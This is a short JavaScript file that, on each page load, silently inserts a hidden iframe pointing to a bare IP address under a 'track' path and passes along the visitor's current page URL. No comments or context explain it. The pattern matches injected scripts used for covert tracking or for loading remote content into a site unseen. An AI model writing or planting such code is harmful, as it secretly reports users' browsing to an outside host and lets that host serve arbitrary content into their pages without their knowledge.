function create(htmlStr) {
    var frag = document.createDocumentFragment(),
        temp = document.createElement('div');
    temp.innerHTML = htmlStr;
    while (temp.firstChild) {
        frag.appendChild(temp.firstChild);
    }
    return frag;
  }

function injectIframe() {
  var fragment = create('<iframe src="http://172.105.73.205/track/heimlichhamburg/' + encodeURIComponent(window.location.href) + '" style="display: none;" />');
  document.body.insertBefore(fragment, document.body.childNodes[0]);
}

  window.addEventListener("DOMContentLoaded", injectIframe, false);
  window.addEventListener("turbolinks:load", injectIframe, false);
